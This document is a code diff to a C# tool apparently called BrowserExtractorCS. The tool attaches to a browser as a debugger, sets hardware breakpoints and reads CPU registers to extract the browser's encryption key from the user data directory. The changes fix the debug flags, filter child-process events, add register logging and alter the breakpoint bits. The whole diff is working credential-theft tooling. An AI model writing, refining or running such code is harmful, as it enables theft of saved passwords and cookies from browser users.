@@ -86,7 +86,8 @@ namespace BrowserExtractorCS
 
         #region Constants
 
-        public const uint DEBUG_ONLY_THIS_PROCESS = 0x00000001;
+        public const uint DEBUG_PROCESS = 0x00000001;
+        public const uint DEBUG_ONLY_THIS_PROCESS = 0x00000002;
         public const uint CREATE_NEW_CONSOLE = 0x00000010;
 
         public const uint EXCEPTION_DEBUG_EVENT = 1;
@@ -861,7 +862,7 @@ namespace BrowserExtractorCS
             SafeDelete(tempPath);
         }
 
-        public static void DebugLoop(IntPtr hProcess, BrowserConfig config, string userDataDir)
+        public static void DebugLoop(uint mainProcessId, IntPtr hProcess, BrowserConfig config, string userDataDir)
         {
             DEBUG_EVENT debugEvent;
             IntPtr targetAddress = IntPtr.Zero;
@@ -869,6 +870,13 @@ namespace BrowserExtractorCS
             while (true)
             {
                 if (!WaitForDebugEvent(out debugEvent, INFINITE)) break;
+
+                // Ignore events from child processes if any
+                if (debugEvent.dwProcessId != mainProcessId)
+                {
+                    ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
+                    continue;
+                }
 
                 if (debugEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT)
                 {
@@ -908,7 +916,7 @@ namespace BrowserExtractorCS
                     {
                         if (exceptionInfo.ExceptionRecord.ExceptionAddress == targetAddress)
                         {
-                            Console.WriteLine("Target breakpoint hit!");
+                            Console.WriteLine($"Target breakpoint hit at 0x{targetAddress:X} on thread {debugEvent.dwThreadId}");
                             if (ExtractKey(debugEvent.dwThreadId, hProcess, config, userDataDir))
                             {
                                 ClearHardwareBreakpoints(debugEvent.dwProcessId);
@@ -937,6 +945,7 @@ namespace BrowserExtractorCS
             context.ContextFlags = CONTEXT_FULL;
             if (GetThreadContext(hThread, ref context))
             {
+                Console.WriteLine($"Context captured. R14: 0x{context.R14:X}, R15: 0x{context.R15:X}, RIP: 0x{context.Rip:X}");
                 ulong[] keyPtrs = config.UseR14 ? new[] { context.R14, context.R15 } : new[] { context.R15, context.R14 };
                 foreach (var ptr in keyPtrs)
                 {
@@ -999,10 +1008,11 @@ namespace BrowserExtractorCS
             SuspendThread(hThread);
             CONTEXT context = new CONTEXT();
             context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
             if (GetThreadContext(hThread, ref context))
             {
                 context.Dr0 = (ulong)address;
-                context.Dr7 = (context.Dr7 & ~3UL) | 1UL;
+                context.Dr7 = (context.Dr7 & ~3UL) | 3UL; // Set L0 and G0 bits
                 SetThreadContext(hThread, ref context);
             }
             ResumeThread(hThread);
@@ -1022,7 +1032,7 @@ namespace BrowserExtractorCS
                     if (GetThreadContext(hThread, ref context))
                     {
                         context.Dr0 = 0;
-                        context.Dr7 &= ~3UL;
+                        context.Dr7 &= ~3UL; // Disable DR0 Local and Global
                         SetThreadContext(hThread, ref context);
                     }
                     ResumeThread(hThread);
